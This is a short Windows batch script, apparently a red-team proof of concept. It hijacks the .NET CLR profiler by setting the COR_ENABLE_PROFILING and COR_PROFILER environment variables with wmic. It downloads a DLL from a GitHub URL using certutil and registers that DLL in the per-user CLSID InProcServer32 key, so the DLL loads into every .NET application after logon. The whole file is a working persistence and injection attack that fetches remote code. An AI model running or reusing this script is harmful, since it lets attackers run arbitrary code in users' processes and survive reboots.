::Author:3gstudent
::Inspired by @subTee
::Need reboot or log off and re-logon
::Inject all the .NET apps
::Support x86 and x64
wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
IF %PROCESSOR_ARCHITECTURE% == x86 (
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F ) ELSE (
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/calc_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/calc_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\calc_x64.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F)
